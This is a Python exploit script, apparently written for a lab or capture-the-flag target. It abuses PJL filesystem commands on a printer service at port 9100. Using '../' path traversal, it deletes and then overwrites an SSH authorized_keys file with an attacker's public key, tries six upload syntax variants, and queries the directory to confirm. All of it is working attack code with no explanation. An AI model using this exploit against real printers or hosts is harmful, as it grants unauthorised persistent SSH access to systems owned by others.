#!/usr/bin/env python3
import socket

KEY = b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHd2jjZHAM69tyxWab23os5aDLAjABySY04Zxxw14x41 kali@kali\n"
N = len(KEY)
PATH = "../.ssh/authorized_keys"


def talk(data: bytes, t: float = 5) -> bytes:
    s = socket.socket()
    s.settimeout(t)
    s.connect(("127.0.0.1", 9100))
    s.sendall(data)
    try:
        return s.recv(8192)
    except socket.timeout:
        return b""
    finally:
        s.close()


# cleanup empty key file
for cmd in (
    f'@PJL FSDELETE NAME="{PATH}"\r\n',
    f'@PJL FSDELETE NAME="{PATH}"\r\n',
):
    print("del", cmd.strip(), repr(talk(cmd.encode())))

variants = {
    "nl": f'@PJL FSUPLOAD NAME="{PATH}"\r\nSIZE={N}\r\n'.encode() + KEY,
    "pjl_size": f'@PJL FSUPLOAD NAME="{PATH}"\r\n@PJL SET SIZE={N}\r\n'.encode() + KEY,
    "bytes": f'@PJL FSUPLOAD NAME="{PATH}"\r\nBYTES={N}\r\n'.encode() + KEY,
    "same_line": f'@PJL FSUPLOAD NAME="{PATH}" SIZE={N}\r\n'.encode() + KEY,
    "noq": f"@PJL FSUPLOAD NAME={PATH}\r\nSIZE={N}\r\n".encode() + KEY,
    "lf": f'@PJL FSUPLOAD NAME="{PATH}"\nSIZE={N}\n'.encode() + KEY,
}
for label, payload in variants.items():
    print("up", label, repr(talk(payload, 8) or b"T"))

q = talk(f'@PJL FSQUERY NAME="../.ssh"\r\n'.encode())
print("query", repr(q))